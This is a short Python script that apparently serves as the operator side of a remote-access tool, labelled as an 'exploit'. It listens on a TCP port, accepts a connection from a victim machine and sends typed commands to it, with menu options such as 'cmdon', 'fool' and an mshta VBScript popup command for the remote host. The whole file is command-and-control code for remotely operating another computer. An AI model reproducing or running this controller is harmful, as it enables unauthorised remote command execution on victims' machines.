import socket

HOST = '000.000.000.00' #Your IP address, get from cmd with command line: ipconfig
PORT = 9090

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen()
client, address = server.accept()
print("choice option: \"cmdon\" \"cmdoff\" \"fool\" \"quit_exploit\"")
print("mshta vbscript:Execute(\"msgbox \"\"Your message here\"\":close\")")
print("(with cmdoff: print the cmdline)")
while True:
    print(f"connected to {address}")
    cmd_input = input("enter a command: ")
    client.send(cmd_input.encode('utf-8'))
    print(client.recv(1024).decode('utf-8'))
